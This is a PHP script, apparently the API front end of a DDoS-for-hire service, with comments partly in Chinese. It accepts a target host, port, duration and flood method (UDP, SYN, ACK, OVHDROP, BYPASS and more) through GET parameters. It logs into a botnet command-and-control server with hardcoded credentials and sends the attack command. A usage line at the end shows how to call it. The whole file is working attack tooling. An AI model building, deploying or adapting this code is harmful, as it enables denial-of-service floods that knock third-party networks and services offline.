<?php
error_reporting(E_ALL);
    // API Keys
    $APIKeys = array("sb", "AddMoreLikeThis");
    // 攻击方法
    $attackMethods = array("UDP-Big", "STD", "SYN","UDP","ACK","HEX","TCP","STOMP","STDHEX","NUDP","UDPHEX","XMAS","BYPASS","RAW","CUDP","OVHDROP","NFO","OVHUDP");

    function htmlsc($string)
    {
        return htmlspecialchars($string, ENT_QUOTES, "UTF-8");
    }

    if (!isset($_GET["key"]) || !isset($_GET["host"]) || !isset($_GET["port"]) || !isset($_GET["time"]) || !isset($_GET["method"]))
        die("You are missing a parameter");

    $key = htmlsc($_GET["key"]);
    $host = htmlsc($_GET["host"]);
    $port = htmlsc($_GET["port"]);
    $time = htmlsc($_GET["time"]);
    $method = htmlsc(strtoupper($_GET["method"]));
    $command = "ack $host $time dport=$port\r\n";

    if (!in_array($key, $APIKeys)) die("Invalid API key");
 
    if (!in_array($method, $attackMethods)) die("Invalid attack method");
    // 攻击方法
    if ($method == "UDP-Big") $command = "udp $host $time port==$port len=1400\r\n";
    else if ($method == "STD") $command = "std $host $time port=$port\r\n";
    else if ($method == "SYN") $command = "syn $host $time port=$port\r\n";
    else if ($method == "UDP") $command = "udp $host $time port=$port\r\n";
    else if ($method == "ACK") $command = "ack $host $time port=$port\r\n";
    else if ($method == "TCP") $command = "tcp $host $time port=$port\r\n";
    else if ($method == "HEX") $command = "hex $host $time port=$port\r\n";
    else if ($method == "STDHEX") $command = "stdhex $host $time port=$port\r\n";
    else if ($method == "NUDP") $command = "nudp $host $time port=$port\r\n";
    else if ($method == "UDPHEX") $command = "udphex $host $time port=$port\r\n";
    else if ($method == "XMAS") $command = "xmas $host $time port=$port\r\n";
    else if ($method == "BYPASS") $command = "bypass $host $time port=$port\r\n";
    else if ($method == "RAW") $command = "raw $host $time port=$port\r\n";
    else if ($method == "CUDP") $command = "cudp $host $time port=$port\r\n";
    else if ($method == "OVHDROP") $command = "ovhdrop $host $time port=$port\r\n";
    else if ($method == "NFO") $command = "nfo $host $time port=$port\r\n";
    else if ($method == "OVHUDP") $command = "ovhudp $host $time port=$port\r\n";

    $socket = fsockopen("1.1.1.1", "3778"); 
    ($socket ? null : die("Failed to connect"));
    // 登录bonet用户名,密码
    fwrite($socket, " \r\n"); // 留下这个
    sleep(3);
    fwrite($socket, "sb\r\n"); // cnc用户名
    sleep(3);
    fwrite($socket, "sb\r\n"); // cnc密码

    sleep(9); 
    fwrite($socket, $command);
  
    fclose($socket);

    echo "Attack sent to $host:$port for $time seconds using method $method!\n";
   
 //接口测试工具 https://v7.apipost.cn/
// Usage: http://site.com/api.php?key=[key]&host=[host]&port=[port]&method=[method]&time=[time]
 
?>
